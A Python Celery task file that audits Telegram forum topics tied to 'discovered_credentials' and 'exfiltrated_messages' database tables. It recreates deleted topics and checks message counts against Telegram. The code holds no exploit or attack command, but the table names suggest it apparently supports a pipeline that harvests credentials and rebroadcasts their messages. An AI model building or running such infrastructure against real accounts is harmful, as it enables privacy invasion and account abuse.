from app.workers.celery_app import app
from app.core.database import db
from app.services.broadcaster_srv import BroadcasterService
from app.core.config import settings
import asyncio
import logging
from telegram.error import TelegramError

logger = logging.getLogger("audit.tasks")
logger.setLevel(logging.INFO)

def _run_sync(coro):
    """Helper to run async code in sync Celery task"""
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
    return loop.run_until_complete(coro)

@app.task(name="audit.audit_active_topics")
def audit_active_topics():
    """
    Periodic task to ensure DB state matches Telegram state.
    1. Checks if 'active' credentials have a valid topic.
    2. Verifies topic existence (via Chat Action).
    3. Triggers recovery if topic found deleted/missing.
    """
    return _run_sync(_audit_active_topics_async())

async def _audit_active_topics_async():
    broadcaster = BroadcasterService()
    await broadcaster.send_log("🛡️ **Audit**: Starting Topic Integrity Check...")
    
    # 1. Fetch all ACTIVE credentials
    try:
        response = db.table("discovered_credentials")\
            .select("id, meta, chat_id")\
            .eq("status", "active")\
            .execute()
        
        creds = response.data or []
        logger.info(f"    [Audit] Checking {len(creds)} active credentials...")
    except Exception as e:
        logger.error(f"    ❌ [Audit] DB Fetch failed: {e}")
        return f"DB Fetch failed: {e}"

    recovered_count = 0
    missing_topic_count = 0
    checked_count = 0
    
    group_id = settings.MONITOR_GROUP_ID
    
    for cred in creds:
        cred_id = cred["id"]
        meta = cred.get("meta") or {}
        topic_id = meta.get("topic_id")
        
        checked_count += 1
        
        # Case A: Active but NO topic_id in DB
        if not topic_id:
            logger.warning(f"    ⚠️ [Audit] Cred {cred_id} is ACTIVE but missing topic_id. Recovering...")
            missing_topic_count += 1
            # Trigger enrichment to create topic
            from app.workers.tasks.flow_tasks import enrich_credential
            enrich_credential.delay(cred_id)
            continue
            
        # Case B: Has topic_id, verify it exists on Telegram
        try:
            # Send 'typing' action to test if topic exists
            # This is silent to users but will fail if topic is deleted
            await broadcaster.bot.send_chat_action(
                chat_id=group_id,
                message_thread_id=topic_id,
                action="typing"
            )
            # If success, topic exists.
            await asyncio.sleep(0.2) # Rate limit
            
        except TelegramError as e:
            err_str = str(e)
            if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
                logger.error(f"    ❌ [Audit] Topic {topic_id} for {cred_id} is DELETED on Telegram. triggering recovery.")
                
                # 1. Clear invalid topic_id from DB
                meta["topic_id"] = None
                db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                
                # 2. Trigger enrich via Celery
                from app.workers.tasks.flow_tasks import enrich_credential
                enrich_credential.delay(cred_id)
                
                recovered_count += 1
            elif "Flood control" in err_str:
                await asyncio.sleep(5) # Backoff
            else:
                logger.warning(f"    ⚠️ [Audit] Check failed for {cred_id} (Topic {topic_id}): {e}")
                continue # Skip message check if topic check failed
        
        # Case C: Message Integrity Check (Double Validation)
        # Check if latest DB message exists in Telegram Topic
        try:
            # Get latest broadcasted message for this credential
            last_msg_db = db.table("exfiltrated_messages")\
                .select("telegram_msg_id, id")\
                .eq("credential_id", cred_id)\
                .eq("is_broadcasted", True)\
                .order("telegram_msg_id", desc=True)\
                .limit(1)\
                .execute()
            
            if last_msg_db.data:
                db_msg_id = last_msg_db.data[0].get("telegram_msg_id")
                
                # Check real state via UserAgent
                from app.services.user_agent_srv import user_agent
                real_last_msg_id = await user_agent.get_last_message_id(group_id, topic_id)
                
                if real_last_msg_id:
                    # If DB has messages but Topic is empty or way behind
                    if real_last_msg_id < db_msg_id:
                         logger.warning(f"    🚨 [Audit] Integrity mismatch for {cred_id}! DB says {db_msg_id}, Telegram says {real_last_msg_id}. Possible data loss or deletion.")
                         # Optional: Trigger re-broadcast of missing messages?
                         # For now, just log.
                    else:
                        # logger.info(f"    ✅ [Audit] Integrity OK for {cred_id}. (DB: {db_msg_id} <= TG: {real_last_msg_id})")
                        pass
        except Exception as e:
            logger.error(f"    ⚠️ [Audit] Message integrity check failed: {e}")

    result_msg = f"🛡️ **Audit Finished**:\nChecked: {checked_count}\nMissing Topics: {missing_topic_count}\nRecovered (Deleted): {recovered_count}"
    logger.info(result_msg)
    await broadcaster.send_log(result_msg)
    return result_msg
